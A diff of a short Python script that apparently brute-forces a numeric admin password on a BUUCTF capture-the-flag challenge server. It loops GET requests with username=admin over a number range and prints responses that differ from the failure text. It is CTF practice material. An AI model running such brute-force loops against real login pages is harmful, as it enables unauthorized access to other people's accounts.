@@ -1,12 +1,11 @@
-import time 
 import requests 
+import time 
 
-url = "http://8bca00c6-17ee-4861-b8d0-a55be3b62b80.node5.buuoj.cn:81/?username=admin&password="
-for i in range(6400,10000):
+url = "http://b7bfca06-395a-48eb-a319-d563523bdcc2.node5.buuoj.cn:81/?username=admin&password="
+for i in range(6450,9000):
     res = requests.get(url + str(i))
-    print("[*] Trying :", str(i))
+    print("[*] Try pls:", str(i))
     time.sleep(0)
-    if res.text != "Bish bnaa":
-        print("***yuwe***")
+    if res.text != "http://buuctf.com":
         print(res.text)
         continue
